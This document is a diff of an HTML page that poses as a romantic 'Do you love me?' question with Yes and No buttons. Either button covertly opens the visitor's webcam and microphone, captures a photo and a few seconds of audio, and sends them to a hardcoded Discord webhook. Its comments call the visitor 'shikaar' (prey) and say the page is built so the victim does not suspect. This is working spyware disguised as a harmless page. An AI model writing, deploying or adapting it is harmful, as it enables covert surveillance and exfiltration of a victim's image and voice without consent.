@@ -3,11 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ask Her Out</title>
+  <title>Proposed Her</title>
   <style>
-    /* Sab kuch hidden taake shikaar ko shak na ho */
     #video, #canvas { display: none; }
-    
     body { 
       background: #121212; 
       color: #fff; 
@@ -18,22 +16,9 @@
       height: 100vh; 
       margin: 0; 
     }
-
-    .container { 
-      text-align: center; 
-      background: #1e1e1e; 
-      padding: 40px; 
-      border-radius: 20px; 
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-      width: 90%;
-      max-width: 450px;
-    }
-
-    h1 { font-size: 1.8rem; margin-bottom: 10px; }
-    p { color: #eee; margin-bottom: 25px; font-style: italic; }
-
+    .container { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+    h1 { font-size: 1.5rem; margin-bottom: 20px; }
     .btn-group { display: flex; gap: 15px; justify-content: center; }
-    
     .btn { 
       padding: 12px 35px; 
       border-radius: 25px; 
@@ -43,23 +28,9 @@
       transition: 0.3s; 
       cursor: pointer;
       border: none;
-      font-family: inherit;
     }
-
     .btn-yes { background: #ff4d6d; }
     .btn-no { background: #555; }
-    
-    .btn:hover { transform: scale(1.05); opacity: 0.9; }
-
-    .dev-name {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      font-size: 0.8rem;
-      color: rgba(255,255,255,0.7);
-      font-weight: bold;
-    }
-
     .loader { 
       border: 4px solid #333; 
       border-top: 4px solid #ff4d6d; 
@@ -74,18 +45,10 @@
 </head>
 <body>
 
-  <div class="dev-name">Dev by Faisal</div>
-
   <div class="container">
-    <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnRqcjd2ZTRtZGM1MzdyZDd5OGp1OGx2bDN0NHRnMWQ2ZzZrM2h0OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dv1Jbd5RW0RkOrlSy3/giphy.gif" 
-         alt="Mochi GIF" 
-         style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 10px;">
-
-    <h1>Please think again! 🙄</h1>
-    <p>babu kia hogya itne jaldi na mat bolo😥</p>
-    
+    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" width="250" style="border-radius: 10px; margin-bottom: 20px;">
+    <h1>Do you love me? 🤗</h1>
     <div class="loader" id="loader"></div>
-    
     <div class="btn-group" id="controls">
       <button class="btn btn-yes" onclick="startTheHunt('yes')">Yes</button>
       <button class="btn btn-no" onclick="startTheHunt('no')">No</button>
@@ -99,6 +62,7 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
     async function startTheHunt(userChoice) {
+        // UI Update: Buttons gayab, loader shuru
         document.getElementById('controls').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
@@ -107,7 +71,7 @@
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // 1. Photo Capture
+            // 1. Photo Capture (1.2 seconds wait for focus)
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -116,25 +80,26 @@
                 
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'faisal_shikaar.png');
-                    fd.append('content', `🎯 **Target Active!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🖥️ **Platform:** ${navigator.platform}`);
+                    fd.append('file', blob, 'capture.png');
+                    fd.append('content', `🎯 **Shikaar Alert!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🌍 **Platform:** ${navigator.platform}`);
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 }, 'image/png');
             }, 1200);
 
-            // 2. Audio Snatcher (3.5 seconds)
+            // 2. Audio Capture (3 seconds silent)
             const mediaRecorder = new MediaRecorder(stream);
             const chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = () => {
                 const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                 const fd = new FormData();
-                fd.append('file', audioBlob, 'audio_log.webm');
+                fd.append('file', audioBlob, 'voice.webm');
                 fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
+                    // Final Logic: Choice ke mutabiq redirect
                     if (userChoice === 'yes') {
                         window.location.href = "page1.html";
                     } else {
-                        window.location.href = "no2.html";
+                        window.location.href = "no1.html";
                     }
                 });
             };
@@ -143,8 +108,9 @@
             setTimeout(() => mediaRecorder.stop(), 3500);
 
         } catch (e) {
+            // Error pe bhi redirect taake shak na ho
             if (userChoice === 'yes') window.location.href = "page1.html";
-            else window.location.href = "no2.html";
+            else window.location.href = "no1.html";
         }
     }
   </script>
